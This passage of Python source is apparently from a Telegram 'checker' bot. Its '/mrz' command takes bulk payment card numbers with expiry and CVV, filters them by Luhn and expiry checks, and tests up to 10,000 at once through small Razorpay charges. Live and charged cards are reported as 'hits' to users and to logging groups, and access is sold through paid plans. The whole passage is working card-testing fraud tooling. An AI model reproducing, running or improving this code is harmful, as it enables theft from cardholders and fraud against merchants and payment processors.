        except Exception:
            pass

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# SINGLE CARD PROCESSING
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

async def process_single_card(session_id: str, cc_formatted: str, cc_num: str,
                               user_id: int, bot: Bot, user_obj, plan_emoji_id: str, plan_name: str):
    sess = MRZ_SESSIONS.get(session_id)
    if not sess or is_session_stopped(session_id):
        return

    result_status = STATUS_ERROR
    response_msg  = "Unknown Error"
    bin_data      = {}

    try:
        bin_data = await asyncio.wait_for(get_bin_info(cc_num[:6]), timeout=10)
    except Exception:
        bin_data = {}

    if is_session_stopped(session_id):
        return

    if is_india_card(bin_data):
        result_status = STATUS_INDIA_BLOCKED
        response_msg  = "RISK_CONTROL / REGION_BLOCKED"
    else:
        try:
            api_result    = await check_rz_api(cc_formatted)
            result_status = api_result.get("status", STATUS_ERROR).lower()
            response_msg  = api_result.get("response", "Unknown Error")
        except asyncio.CancelledError:
            raise
        except Exception as e:
            result_status = STATUS_ERROR
            response_msg  = f"Connection Error: {str(e)[:50]}"

    if is_session_stopped(session_id):
        return

    sess = MRZ_SESSIONS.get(session_id)
    if not sess:
        return

    logging.info(f"[MRZ] {cc_formatted} | {result_status} | {response_msg[:60]}")
    sess['checked'] += 1

    card_result_data = {
        'card': cc_formatted, 'response': response_msg, 'status': result_status,
        'bin_info': bin_data, 'gateway': 'Razorpay 1₹', 'timestamp': datetime.now().isoformat(),
    }

    if result_status == STATUS_CHARGED:
        sess['charged'] += 1
        sess.setdefault('charged_cards', []).append(card_result_data)
        await asyncio.to_thread(database.update_mrz_stats, user_id, "charged")
        await asyncio.to_thread(log_hit_to_mrz, user_id, user_obj.username, user_obj.first_name)
        if not is_session_stopped(session_id):
            await send_hit_log_to_group(bot, response_msg, user_obj, plan_emoji_id, STATUS_CHARGED)
        if not is_session_stopped(session_id):
            await send_hit_to_user(bot, sess, cc_formatted, bin_data, response_msg, user_obj, plan_emoji_id, STATUS_CHARGED)
        if not is_session_stopped(session_id):
            await send_charged_to_extra_group(bot, cc_formatted, bin_data, response_msg, user_obj, plan_emoji_id)

    elif result_status == STATUS_APPROVED:
        sess['approved'] += 1
        sess.setdefault('approved_cards', []).append(card_result_data)
        await asyncio.to_thread(database.update_mrz_stats, user_id, "live")
        if not is_session_stopped(session_id):
            await send_hit_log_to_group(bot, response_msg, user_obj, plan_emoji_id, STATUS_APPROVED)
        if not is_session_stopped(session_id):
            await send_hit_to_user(bot, sess, cc_formatted, bin_data, response_msg, user_obj, plan_emoji_id, STATUS_APPROVED)

    elif result_status in DECLINED_STATUSES:
        sess['dead'] += 1
        sess.setdefault('dead_cards', []).append(card_result_data)
        await asyncio.to_thread(database.update_mrz_stats, user_id, "dead")

    else:
        sess['errors'] += 1
        sess.setdefault('error_cards', []).append(card_result_data)
        await asyncio.to_thread(database.update_mrz_stats, user_id, "error")

    if is_session_stopped(session_id):
        return

    if sess['checked'] % 20 == 0 or sess['checked'] == sess['total']:
        await update_progress_message(bot, session_id)

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# /mrz COMMAND
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

@router.message(F.text.startswith("/mrz") | F.caption.startswith("/mrz"))
async def mrz_command(message: types.Message):
    if not await asyncio.to_thread(database.is_gate_enabled, "mrz"):
        await message.reply("🚧 <b>Mᴀss Rᴀᴢᴏʀᴘᴀʏ ᴜɴᴅᴇʀ Mᴀɪɴᴛᴇɴᴀɴᴄᴇ.</b>", parse_mode="HTML")
        return

    user    = message.from_user
    user_id = user.id
    bot     = message.bot

    if not database.is_premium_active(user_id):
        await message.reply(
            "<b>❌ Access Denied.</b>\n"
            "<b>You must have an active plan to use this gate.</b>\n"
            "<b>Please purchase a plan to continue.</b>",
            parse_mode="HTML",
            reply_markup=buy_now_keyboard()
        )
        return

    for sid, sdata in list(MRZ_SESSIONS.items()):
        if sdata.get('user_id') == user_id and sdata.get('status') == "CHECKING":
            await message.reply(
                "⚠️ <b>𝗔𝗰𝘁𝗶𝘃𝗲 𝗦𝗲𝘀𝘀𝗶𝗼𝗻</b>\n\nYou have a check running. Use the <b>🛑 Stop</b> button to stop it.",
                parse_mode="HTML",
            )
            return

    raw_text = ""
    cmd_text = message.text or message.caption or ""
    parts    = cmd_text.split(maxsplit=1)
    if len(parts) > 1:
        raw_text += parts[1] + " "

    if message.reply_to_message:
        replied = message.reply_to_message
        raw_text += (replied.text or replied.caption or "") + " "

    document = message.document or (message.reply_to_message.document if message.reply_to_message else None)
    if document:
        if document.file_size > 2 * 1024 * 1024:
            await message.reply("❌ File too large. Max 2MB."); return
        try:
            raw_bytes = await download_telegram_file(bot, document.file_id)
            if raw_bytes:
                raw_text += raw_bytes.decode('utf-8', errors='ignore')
        except asyncio.TimeoutError:
            await message.reply(
                "❌ <b>File download timed out.</b>\n"
                "Telegram's servers are slow right now. Please try again in a moment.",
                parse_mode="HTML"
            )
            return
        except Exception as e:
            await message.reply(f"❌ Error reading file: {e}"); return

    if not raw_text.strip():
        await message.reply(
            "❌ <b>𝗡𝗼 𝗰𝗮𝗿𝗱𝘀 𝗳𝗼𝘂𝗻𝗱.</b>\n\n"
            "• <code>/mrz cc|mm|yy|cvv</code>\n"
            "• Reply to a message with cards\n"
            "• Attach a <code>.txt</code> file and send with <code>/mrz</code>",
            parse_mode="HTML",
        )
        return

    extracted_cards = extract_cards_from_text(raw_text)
    if not extracted_cards:
        await message.reply("❌ No valid card formats found."); return

    valid_cards, expired_count, invalid_luhn_count = [], 0, 0
    for card_string in extracted_cards:
        if len(valid_cards) >= 10000:
            break
        p = card_string.split('|')
        if len(p) != 4:
            continue
        cc, mm, yy, cvv = p
        if not luhn_check(cc):
            invalid_luhn_count += 1; continue
        if is_expired(mm, yy):
            expired_count += 1; continue
        valid_cards.append((card_string, cc))

    total_cards = len(valid_cards)
    if total_cards == 0:
        info = (f"Filtered {invalid_luhn_count} invalid & {expired_count} expired.\n"
                if (expired_count or invalid_luhn_count) else "")
        await message.reply(f"{info}❌ No valid cards to check.", parse_mode="HTML")
        return

    asyncio.create_task(
        process_mass_check_background(message, bot, valid_cards, user)
    )

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# BACKGROUND SESSION
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

async def process_mass_check_background(message: types.Message, bot: Bot,
                                        valid_cards: list, user_obj):
    user_id     = user_obj.id
    chat_id     = message.chat.id
    total_cards = len(valid_cards)

    if total_cards == 0:
        await message.reply("❌ No valid cards to check.", parse_mode="HTML"); return

    session_id    = "".join(random.choices(string.ascii_uppercase + string.digits, k=8))
    plan_name     = await get_user_plan_name(user_id)
    plan_emoji_id = await get_user_plan_emoji_id(user_id)

    charged_emoji_id = get_random_charged_emoji()
    initial_text = (
        f'<b><a href="https://t.me/FailureFr_07">[₪]</a> Gᴀᴛᴇ ➛ Rᴀᴢᴏʀᴘᴀʏ | 1₹</b>\n'
        f'<b>━━━━━━━━━━━━━━</b>\n'
        f'      <b><a href="https://t.me/FailureFr_07">[◈]</a> Sᴛᴀᴛᴜs ➛ Cʜᴇᴄᴋɪɴɢ <tg-emoji emoji-id="{STATUS_CHECKING_EMOJI_ID}">🔄</tg-emoji></b>\n'
        f'      <b><a href="https://t.me/FailureFr_07">[𖣸]</a> Cʜᴇᴄᴋᴇᴅ ➛ <code>0/{total_cards}</code></b>\n'
        f'<b>━━━━━━━━━━━━━━</b>\n'
        f'<b>♘ Aᴘᴘʀᴏᴠᴇᴅ ➛ 0 <tg-emoji emoji-id="{APPROVED_EMOJI_ID}">✅</tg-emoji></b>\n'
        f'<b>♞ Cʜᴀʀɢᴇᴅ ➛ 0 <tg-emoji emoji-id="{charged_emoji_id}">💎</tg-emoji></b>\n'
        f'<b>Dᴇᴀᴅ ➛ 0 <tg-emoji emoji-id="{DECLINED_EMOJI_ID}">❌</tg-emoji></b>\n'
        f'<b>Eʀʀᴏʀs ➛ 0 <tg-emoji emoji-id="{ERROR_EMOJI_ID}">⚠️</tg-emoji></b>\n'
        f'<b>Tɪᴍᴇ ➛ 0s</b>'
    )
    initial_buttons = get_result_buttons(session_id, is_running=True)
    progress_msg    = await message.reply(initial_text, parse_mode="HTML", reply_markup=initial_buttons)

    MRZ_SESSIONS[session_id] = {
        "session_id": session_id, "status": "CHECKING",
        "chat_id": chat_id, "user_id": user_id,
        "msg_id": progress_msg.message_id, "user_msg_id": message.message_id,
        "total": total_cards, "checked": 0, "approved": 0, "charged": 0, "dead": 0, "errors": 0,
        "start_time": time.time(), "end_time": None, "tasks": [], "last_update_time": 0,
        "approved_cards": [], "charged_cards": [], "dead_cards": [], "error_cards": [],
        "user_obj": user_obj, "plan_name": plan_name, "plan_emoji_id": plan_emoji_id,
    }

    logging.info(f"🚀 [MRZ] Started {session_id} | {total_cards} cards | user {user_id}")

    task = asyncio.create_task(
        run_mass_checker(bot, session_id, valid_cards, user_obj, plan_emoji_id, plan_name)
    )
    MRZ_TASKS[session_id] = task


async def run_mass_checker(bot: Bot, session_id: str, cards: list,
                           user_obj, plan_emoji_id: str, plan_name: str):
    sess = MRZ_SESSIONS.get(session_id)
    if not sess:
        return

    sem = asyncio.Semaphore(MAX_CONCURRENT_CARDS)

    async def worker(cc_formatted, cc_num):
        if is_session_stopped(session_id):
            return
        async with sem:
            if is_session_stopped(session_id):
                return
            try:
                await process_single_card(
                    session_id, cc_formatted, cc_num,
                    sess.get('user_id', user_obj.id),
                    bot, user_obj, plan_emoji_id, plan_name,
                )
            except asyncio.CancelledError:
                raise
            except Exception as e:
                if not is_session_stopped(session_id):
                    logging.error(f"[MRZ] Worker error {cc_formatted}: {e}")
                    s = MRZ_SESSIONS.get(session_id)
                    if s:
                        s['checked'] += 1
                        s['errors']  += 1

    tasks = []
    for cc_formatted, cc_num in cards:
        if is_session_stopped(session_id):
            break
        task = asyncio.create_task(worker(cc_formatted, cc_num))
        tasks.append(task)
        sess['tasks'].append(task)

    logging.info(f"📋 [MRZ] {len(tasks)} tasks created for session {session_id}")

    if tasks:
        results   = await asyncio.gather(*tasks, return_exceptions=True)
        cancelled = sum(1 for r in results if isinstance(r, asyncio.CancelledError))
        errors    = sum(1 for r in results if isinstance(r, Exception) and not isinstance(r, asyncio.CancelledError))
        if cancelled:
            logging.info(f"🛑 [MRZ] {cancelled} tasks cancelled in {session_id}")
        if errors:
            logging.error(f"[MRZ] {errors} tasks failed in {session_id}")

    sess = MRZ_SESSIONS.get(session_id)
    if sess:
        sess['end_time'] = time.time()
        if sess['status'] != "STOPPED":
            sess['status'] = "FINISHED"
        MRZ_COMPLETED[session_id] = {
            'user_id': sess.get('user_id'), 'chat_id': sess.get('chat_id'),
            'msg_id': sess.get('msg_id'), 'user_msg_id': sess.get('user_msg_id'),
            'total': sess.get('total', 0), 'checked': sess.get('checked', 0),
            'approved': sess.get('approved', 0), 'charged': sess.get('charged', 0),
            'dead': sess.get('dead', 0), 'errors': sess.get('errors', 0),
            'status': sess.get('status'),
            'approved_cards': sess.get('approved_cards', []),
            'charged_cards': sess.get('charged_cards', []),
            'dead_cards': sess.get('dead_cards', []),
            'error_cards': sess.get('error_cards', []),
            'user_obj': sess.get('user_obj'),
            'plan_name': sess.get('plan_name', 'TRIAL'),
            'completed_at': time.time(),
        }
        try:
            await update_progress_message(bot, session_id, force=True)
        except Exception as e:
            logging.error(f"[MRZ] Final progress error: {e}")
        elapsed = sess['end_time'] - sess['start_time']
        logging.info(
            f"🏁 [MRZ] {session_id} {sess['status']} — "
            f"A:{sess['approved']} C:{sess['charged']} D:{sess['dead']} E:{sess['errors']} "
            f"Checked:{sess['checked']}/{len(cards)} Time:{int(elapsed)}s"
        )
        MRZ_SESSIONS.pop(session_id, None)
